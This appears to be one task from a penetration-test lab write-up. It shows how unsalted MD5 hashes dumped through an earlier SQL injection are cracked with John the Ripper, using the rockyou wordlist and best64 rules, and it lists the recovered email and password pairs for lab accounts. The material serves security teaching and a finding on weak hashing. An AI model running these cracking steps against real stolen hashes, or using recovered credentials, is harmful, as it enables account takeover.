# Task 11: Cracking the Stolen Hashes

**Vulnerability:** Use of a Broken or Weak Hash, unsalted MD5 (CWE-916)

**Endpoint:** offline, against the hashes dumped in Task 8

Task 8 pulled every `email:hash` pair out of the `users` and `admins` tables through
the pre-auth lookup injection. The stored passwords are unsalted MD5, which is fast
to compute and has no per-row salt, so the whole set falls to a straight dictionary
run. This task turns those hashes back into working passwords and notes which ones
resist.

---

## Steps

Build the input file. The `email:hash` pairs from the Task 8 dumps go straight into
a file, one pair per line. John reads this format directly, treating the email as
the login and the value after the colon as the hash to crack, so the cracked output
comes back already mapped to each account.

```
nano user-file.txt
```

Crack with John against rockyou. The hashes are unsalted MD5, so the format is
`raw-md5`. Pinning the format stops John guessing something else from the
email-prefixed lines.

```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt user-file.txt
```

John loads 14 hashes and cracks 12 on the first pass, in under a second. That speed
is the whole point of the finding: unsalted MD5 offers no work factor, so a
commodity wordlist clears the common passwords instantly.

Below shows the cracked set with accounts attached. This is the clean evidence view, since
it pairs every email with its plaintext and reports how many remain.

```
john --format=raw-md5 --show user-file.txt
```

Escalate the holdouts with a rules pass. The hashes still standing are not literally
in rockyou, so `best64` mutates each word (appended digits, capitalization,
reversing, duplication) to catch the obvious variants. This cracks one of the two
remaining hashes, leaving a single resister.

```
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 user-file.txt
```

## Evidence

John cracking the dumped hashes against rockyou, clearing most of the set on the
first pass:

<img width="953" height="478" alt="john raw-md5 rockyou run cracking the dumped hashes" src="https://github.com/user-attachments/assets/8e04a618-5c6f-412c-b582-fed68707cd28" />

`john --show` listing each account with its cracked password and the count still
uncracked:

<img width="1077" height="331" alt="john --show output pairing emails with cracked passwords" src="https://github.com/user-attachments/assets/9083a6b3-bf1f-4967-818f-25a39b631522" />

The `best64` rules pass cracking one of the leftover hashes:

<img width="1077" height="331" alt="john best64 rules pass cracking a leftover hash" src="https://github.com/user-attachments/assets/118754a9-0d7f-4757-8bfa-c22cee2fa707" />

Cracked credentials recovered:

```
Staff
  a.deshmukh@electra.lab   admin123
  v.malone@electra.lab     trustno1

Customers
  m.holloway@electra.lab   password123
  p.raghavan@electra.lab   sunshine
  s.ortiz@electra.lab      football
  g.lindqvist@electra.lab  princess1
  v.chen@electra.lab       starwars
  t.bergen@electra.lab     trustno1
  h.whitfield@electra.lab  passw0rd
  n.petrova@electra.lab    dragon123

Other accounts (Topmost are previously compromised customers)
  pwned@test.com           welcome1
  takeover@electra.lab     monkey123
  ops@greenvalley.example  greenvalley
  billing@ssd186.example   school2026
```

An interesting result is that `t.bergen` (customer) and `v.malone`
(staff) resolve to the same hash and the same plaintext, `trustno1`, so cracking a
customer password handed over a working staff password due to reuse.

## What this reveals to an attacker

Unsalted MD5 means the credential dump from Task 8 converts to live passwords almost
instantly, with no salt to force per-hash work. An attacker logs in as any of these
users with their real password, which is far stealthier than the SQL injection auth bypass
and survives a fix to the injection. Password reuse across the customer and staff
tables means one cracked customer hash yields staff access, and the weak staff
password (`admin123`) means the administrative console was never protected well.
Because the hashes are unsalted, identical passwords produce identical
hashes, which is how the reuse was visible at a glance before it was even cracked.

## Remediation

See [remediation](../remediation.md)
